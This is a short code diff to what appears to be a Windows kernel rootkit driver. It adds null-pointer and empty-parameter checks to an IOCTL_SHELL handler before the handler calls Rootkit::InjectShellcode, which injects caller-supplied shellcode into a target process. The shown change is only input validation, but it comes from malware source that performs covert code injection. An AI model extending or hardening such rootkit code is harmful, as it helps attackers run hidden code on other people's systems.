@@ -168,6 +168,22 @@ NTSTATUS Dispatch::DriverDispatch(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Ir
     case IOCTL_SHELL:
     {
         Shell* shell = (Shell*)Irp->AssociatedIrp.SystemBuffer;
+        if (shell == NULL)
+        {
+            DbgPrint("[-] Received empty buffer\n");
+
+            status = STATUS_INVALID_PARAMETER;
+            break;
+        }
+
+        if (shell->pid == NULL || shell->shellcode == NULL || shell->size == NULL)
+        {
+            DbgPrint("[-] Received empty parameter\n");
+
+            status = STATUS_INVALID_PARAMETER;
+            break;
+        }
+
         buffer = Rootkit::InjectShellcode(shell);
         bytesIO = sizeof(Shell);
 
@@ -185,6 +201,7 @@ NTSTATUS Dispatch::DriverDispatch(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Ir
 
         break;
     }
+
     default:
         status = STATUS_INVALID_DEVICE_REQUEST;
         break;
